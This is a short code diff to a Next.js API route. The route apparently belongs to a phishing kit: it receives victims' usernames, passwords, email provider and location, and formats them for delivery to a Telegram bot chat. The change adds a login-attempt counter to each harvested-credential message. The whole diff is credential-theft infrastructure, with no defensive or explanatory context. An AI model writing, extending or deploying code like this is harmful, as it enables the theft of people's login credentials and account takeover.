@@ -5,7 +5,7 @@ import { NextResponse } from 'next/server';
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { username, password, provider, city, country } = body;
+    const { username, password, provider, city, country, attempt } = body;
 
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -29,6 +29,7 @@ export async function POST(request: Request) {
 🔑 <b>Pass:</b> <code>${password}</code>
 🌐 <b>Provider:</b> ${provider}
 📍 <b>Location:</b> ${city}, ${country}
+🔢 <b>Attempt:</b> #${attempt ?? 1}
 ━━━━━━━━━━━━━━━━
     `;
 
